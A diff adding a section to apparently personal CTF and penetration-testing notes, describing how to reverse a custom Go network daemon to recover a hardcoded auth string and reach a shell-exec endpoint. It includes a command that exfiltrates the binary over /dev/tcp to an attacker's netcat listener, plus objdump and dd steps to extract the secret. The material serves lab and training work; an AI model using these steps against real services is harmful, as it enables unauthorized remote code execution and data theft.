@@ -2838,3 +2838,34 @@ No specific CVE for the protocol; the two abuse classes are design-level: first-
 - THM GoldenEye — POP3 multi-stage pivot + kernel exploit
 - THM IDE — vsftpd anonymous FTP + Codiad RCE + service privesc
 - THM BiteMe — Fail2ban abuse for root
+
+## Custom Go service: RE the binary for a hardcoded auth string + exec sink
+
+A custom network daemon (often a Go `net/http` server on an odd port) that gates a "command"/
+"directive" endpoint behind a code is usually reversible in minutes, do NOT brute the protocol.
+The auth is frequently a plaintext string comparison and the sink a shell exec, so extracting the
+string gives command execution as whatever user the service runs.
+
+1. **Confirm the runtime + user.** `ss -ltnp` (which pid owns the port) and, if it is a systemd
+   service, `systemctl cat <svc>` -> `User=`. A `User=root` service with a command sink = root RCE.
+2. **Exfil the binary** (world-readable is common): `cat /path/bin > /dev/tcp/<lhost>/<port>` to an
+   `nc -lvnp <port>` listener on the attack box.
+3. **Disassemble the handler.** Go binaries keep symbols unless stripped/garbled:
+   `GOROOT=$(ls -d /usr/local/go /usr/lib/go-* | head -1) go tool objdump -s main.main <bin>`
+   (or GNU `objdump -d`). Read the handler for two calls:
+   - `runtime.memequal` / `strcmp` on the auth value => the code/token is a **plaintext string in
+     `.rodata`**. The `CMPQ BX, $0xN` just before it is the length; the `LEAQ 0x..(IP), BX` before
+     that points at the string.
+   - `os/exec.Command` / `.Output` / `.Run` => your input is **run as a shell command** (the LEAQ'd
+     4-byte string is often `bash`).
+4. **Read the string from `.rodata`.** Resolve the `LEAQ` target VA (`next-instr-addr + disp`), then
+   map VA->file offset with the read-only LOAD segment from `readelf -lW <bin>`
+   (`offset + (VA - vaddr)`), and `dd if=<bin> bs=1 skip=<fileoff> count=<len>`.
+5. **Fire the sink** with the extracted code (often an HTTP header the strings/handler reveal, e.g.
+   `Clearance-Code:`) + the directive -> RCE as the service's user.
+
+Also works for non-Go daemons: `strings`/`objdump`/Ghidra to find the compared constant + the
+`system()`/`exec*()` sink. A plaintext-compared secret in a binary is not a secret. See
+[[binary-exploitation]].
+
+<!-- promoted-slug: go-service-rodata-rce -->
